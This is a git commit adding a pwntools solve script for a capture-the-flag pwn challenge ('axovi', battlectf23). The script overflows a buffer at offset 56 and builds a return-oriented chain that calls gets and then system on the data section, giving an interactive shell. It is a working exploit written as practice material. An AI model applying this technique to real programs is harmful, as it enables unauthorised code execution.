1422800214c60c460713a17e5b83cfa649df7f10
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-07-04 18:38:34 +0100

    Create solve.py

---
+++ solvescript/battlectf23/prequal/pwn/axovi/solve.py
@@ -0,0 +1,52 @@
+#!/usr/bin/python3
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './axovi'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 56
+
+data = 0x000000000404028 # data section
+pop_rdi = 0x00000000004011bb # pop rdi; ret;
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        data,
+        elf.plt['gets'],
+        pop_rdi,
+        data,
+        elf.plt['system']
+]
+})
+
+io.sendline(payload)
+io.interactive()
